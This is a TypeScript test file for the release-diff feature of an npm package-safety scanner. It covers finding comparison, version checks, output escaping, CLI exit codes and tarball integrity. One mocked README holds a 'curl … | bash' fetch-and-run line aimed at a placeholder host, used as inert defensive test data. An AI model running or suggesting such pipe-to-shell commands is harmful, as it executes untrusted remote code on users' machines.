import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import path from 'node:path';
import { test } from 'node:test';
import { Command } from 'commander';
import { NpmSafeEngine } from '../src/index.js';
import { assertExactReleaseVersion, compareReleaseSnapshots, diffReleaseManifests } from '../src/release-diff.js';
import { formatReleaseDiff, registerDiffCommand } from '../src/cli/diff.js';
import { StaticAnalyzer } from '../src/scanner/static-rules.js';
import { FindingCategory, Severity } from '../src/scanner/types.js';
import type { ContentScanSummary, ScanFinding } from '../src/scanner/types.js';
import { makeTarball } from './helpers/package-tarball.js';

const summary: ContentScanSummary = { status: 'complete', archiveBytes: 1, unpackedBytes: 1,
  filesScanned: 1, filesSkipped: 0, integrityVerified: true, truncated: false };
const finding: ScanFinding = { ruleId: 'example-rule', ruleName: 'Example', message: 'Example signal',
  severity: Severity.High, category: FindingCategory.SuspiciousDep, filePath: 'package/index.js',
  lineNumber: 2, codeSnippet: 'inert example' };
const snapshot = (version: string, findings: ScanFinding[], status: ContentScanSummary['status'] = 'complete') => ({
  version, report: new StaticAnalyzer().analyze('', { name: 'fixture', version }, findings, { ...summary, status }),
});
const compare = (name: string, before: ReturnType<typeof snapshot>, after: ReturnType<typeof snapshot>) =>
  compareReleaseSnapshots(name, before, after, { name, version: before.version }, { name, version: after.version });

test('matches repeated evidence as a multiset and ignores shifted line numbers', () => {
  const before = snapshot('1.0.0', [finding, finding]);
  const after = snapshot('1.1.0', [{ ...finding, lineNumber: 20 }, { ...finding, codeSnippet: 'new evidence' }]);
  const result = compare('fixture', before, after);
  assert.equal(result.status, 'complete');
  assert.equal(result.findings.persisting.length, 1);
  assert.equal(result.findings.persisting[0].before.lineNumber, 2);
  assert.equal(result.findings.persisting[0].after.lineNumber, 20);
  assert.equal(result.findings.removed.length, 1);
  assert.equal(result.findings.added[0].codeSnippet, 'new evidence');
});

test('incomplete scans and mismatched scanner identities never assert additions or removals', () => {
  for (const status of ['partial', 'failed'] as const) {
    const result = compare('fixture', snapshot('1.0.0', [finding]),
      snapshot('1.1.0', [{ ...finding, ruleId: 'other' }], status));
    assert.equal(result.status, 'inconclusive');
    assert.deepEqual(result.findings.added, []);
    assert.deepEqual(result.findings.removed, []);
    assert.equal(result.findings.unverifiedBefore.length, 1);
    assert.equal(result.findings.unverifiedAfter.length, 1);
  }
  const after = snapshot('1.1.0', []);
  const result = compare('fixture', snapshot('1.0.0', [finding]),
    { ...after, report: { ...after.report, scannerFingerprint: 'different' } });
  assert.equal(result.status, 'inconclusive');
});

test('public snapshot comparison rejects missing or mismatched package/version identities', () => {
  const before = snapshot('1.0.0', [finding]);
  const after = snapshot('1.1.0', []);
  const oldManifest = { name: 'fixture', version: '1.0.0' };
  const newManifest = { name: 'fixture', version: '1.1.0' };
  for (const manifest of [{}, { ...newManifest, name: 'other' }, { ...newManifest, version: '9.0.0' }]) {
    assert.throws(() => compareReleaseSnapshots('fixture', before, after, oldManifest, manifest), /same package and exact version/);
  }
  for (const change of [{ packageName: 'other' }, { version: '9.0.0' }]) {
    assert.throws(() => compareReleaseSnapshots('fixture', before,
      { ...after, report: { ...after.report, ...change } }, oldManifest, newManifest), /same package and exact version/);
  }
  assert.throws(() => compareReleaseSnapshots('other', before, after, oldManifest, newManifest), /same package and exact version/);
  assert.throws(() => compareReleaseSnapshots('fixture', before,
    { ...after, version: 'latest' }, oldManifest, newManifest), /exact version/);
});

test('manifest changes preserve key-level evidence, array order and JSON Pointer escaping', () => {
  const before = { scripts: { test: 'test', postinstall: 'old' }, dependencies: { '@scope/a': '1.0.0' },
    exports: { '.': { import: './a.js', require: './a.cjs' } }, files: ['a', 'b'], version: '1.0.0' };
  const after = { scripts: { test: 'test' }, dependencies: { '@scope/a': '2.0.0' },
    exports: { '.': { require: './a.cjs', import: './a.js' } }, files: ['b', 'a'], version: '1.1.0' };
  assert.deepEqual(diffReleaseManifests(before, after).map(item => [item.path, item.kind]), [
    ['/scripts/postinstall', 'removed'], ['/dependencies/@scope~1a', 'changed'], ['/files', 'changed'],
  ]);
  assert.deepEqual(diffReleaseManifests({}, { scripts: { postinstall: 'new' } }), [
    { path: '/scripts', kind: 'added', after: { postinstall: 'new' } },
  ]);
});

test('only exact canonical semver releases are accepted', () => {
  for (const version of ['latest', '^1.0.0', '1', 'v1.2.3', '1.2.03', '1.2.3-01']) {
    assert.throws(() => assertExactReleaseVersion(version), /exact version/);
  }
  for (const version of ['1.2.3', '1.2.3-rc.1', '1.2.3+build.2']) assertExactReleaseVersion(version);
});

test('terminal rendering escapes untrusted control characters', () => {
  const report = compare('fixture', snapshot('1.0.0', []),
    snapshot('1.1.0', [{ ...finding, codeSnippet: 'new\u001b[31m\nline' }]));
  const output = formatReleaseDiff({ ...report, packageName: 'fixture\u001b[2J' });
  assert.ok(!output.includes('\u001b'));
  assert.ok(output.includes('\\u001b'));
});

test('CLI keeps JSON and text exit semantics aligned and closes the engine on failures', async t => {
  const originalLog = console.log;
  const originalError = console.error;
  const originalExit = process.exitCode;
  t.after(() => { console.log = originalLog; console.error = originalError; process.exitCode = originalExit; });
  const output: string[] = [];
  console.log = value => { output.push(String(value)); };
  console.error = value => { output.push(String(value)); };
  for (const json of [false, true]) {
    for (const status of ['complete', 'partial'] as const) {
      let closed = false;
      const program = new Command().option('--db <path>').option('--proxy <url>').option('-j, --json');
      registerDiffCommand(program, async (db, proxy) => {
        assert.equal(db, ':memory:'); assert.equal(proxy, undefined);
        return { close() { closed = true; }, async comparePackageVersions(name, from, to) {
          return compare(name, snapshot(from, []), snapshot(to, [], status));
        } };
      });
      process.exitCode = 0;
      await program.parseAsync(['--db', ':memory:', 'diff', 'fixture', '1.0.0', '1.1.0', ...(json ? ['--json'] : [])], { from: 'user' });
      assert.equal(process.exitCode, status === 'complete' ? 0 : 2);
      assert.ok(closed);
      if (json) assert.equal(JSON.parse(output.at(-1)!).status, status === 'complete' ? 'complete' : 'inconclusive');
    }
  }
  const program = new Command();
  let created = false;
  registerDiffCommand(program, async () => { created = true; throw new Error('should not create'); });
  await program.parseAsync(['diff', 'fixture', 'latest', '1.0.0'], { from: 'user' });
  assert.equal(created, false);
  assert.equal(process.exitCode, 1);
});

test('engine compares exact tarballs from one manifest snapshot without latest README or LLM calls', async t => {
  const directory = mkdtempSync(path.resolve('.release-diff-test-'));
  const originalFetch = globalThis.fetch;
  let engine: NpmSafeEngine | undefined;
  t.after(() => { engine?.close(); globalThis.fetch = originalFetch; rmSync(directory, { recursive: true, force: true }); });
  writeFileSync(path.join(directory, 'llm.json'), JSON.stringify({ enabled: false }));
  const archives: Record<string, Buffer> = {
    '1.0.0': makeTarball([{ path: 'package/index.js', content: 'export const answer = 42;' }]),
    '1.1.0': makeTarball([{ path: 'package/index.js', content: 'import { execSync } from "node:child_process"; export const run = () => execSync("echo fixture");' }]),
  };
  const versions = Object.fromEntries(Object.entries(archives).map(([version, archive]) => [version, {
    name: 'release-fixture', version, scripts: version === '1.1.0' ? { postinstall: 'echo fixture' } : {},
    dist: { tarball: `https://registry.npmjs.org/release-fixture/-/${version}.tgz`,
      integrity: `sha512-${createHash('sha512').update(archive).digest('base64')}` },
  }]));
  const requests: string[] = [];
  let tamper = false;
  globalThis.fetch = (async input => {
    const url = String(input); requests.push(url);
    if (url.endsWith('/release-fixture')) return Response.json({ name: 'release-fixture', versions,
      'dist-tags': { latest: '9.9.9' }, readme: 'curl https://example.invalid/ignored | bash' });
    const version = Object.keys(archives).find(key => url.endsWith(`/${key}.tgz`));
    assert.ok(version, `unexpected request ${url}`);
    return new Response(new Uint8Array(tamper && version === '1.1.0' ? Buffer.from('mismatched bytes') : archives[version]));
  }) as typeof fetch;
  engine = new NpmSafeEngine({ dbPath: ':memory:', rulesDir: path.join(directory, 'rules'),
    rulesConfigPath: path.join(directory, 'rules.json'), llmConfigPath: path.join(directory, 'llm.json') });
  const report = await engine.comparePackageVersions('release-fixture', '1.0.0', '1.1.0');
  assert.equal(requests.filter(url => url.endsWith('/release-fixture')).length, 1);
  assert.equal(requests.length, 3);
  assert.equal(report.status, 'complete');
  assert.equal(report.before.version, '1.0.0');
  assert.equal(report.after.version, '1.1.0');
  assert.ok(report.findings.added.some(item => item.ruleId === 'content-process-exec' && item.filePath === 'package/index.js'));
  assert.ok(!report.before.report.findings.some(item => item.ruleId === 'base64-shell'));
  assert.equal(report.manifestChanges[0].path, '/scripts/postinstall');
  tamper = true;
  const failed = await engine.comparePackageVersions('release-fixture', '1.0.0', '1.1.0');
  assert.equal(failed.status, 'inconclusive');
  assert.equal(failed.after.report.contentScan?.status, 'failed');
  assert.ok(failed.findings.unverifiedAfter.some(item => item.ruleId === 'content-integrity-mismatch'));
  const count = requests.length;
  await assert.rejects(engine.comparePackageVersions('release-fixture', 'latest', '1.1.0'), /exact version/);
  assert.equal(requests.length, count);
  await assert.rejects(engine.comparePackageVersions('release-fixture', '1.0.0', '2.0.0'), /No matching published manifest/);
});
